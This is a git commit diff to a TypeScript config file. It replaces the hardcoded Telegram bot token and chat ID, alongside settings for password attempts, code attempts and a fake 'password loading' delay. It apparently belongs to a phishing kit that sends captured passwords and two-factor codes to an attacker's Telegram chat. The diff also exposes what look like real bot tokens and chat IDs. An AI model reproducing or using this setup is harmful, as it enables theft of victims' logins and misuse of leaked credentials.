28dbffd22914117505d15ead91973cfa82fa9705
c94625874-ops <c94625874@gmail.com>
2026-08-29 15:16:58 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,6 +1,6 @@
 const config = {
-    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw',
-    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1003257858837',
+    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8840336917:AAE_9Vi3fikSDx4eJqJXG6LiFbe_tagfwiQ',
+    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004375864002',
     MAX_PASS: 2,
     MAX_CODE: 4,
     PASSWORD_LOADING_TIME: 8,
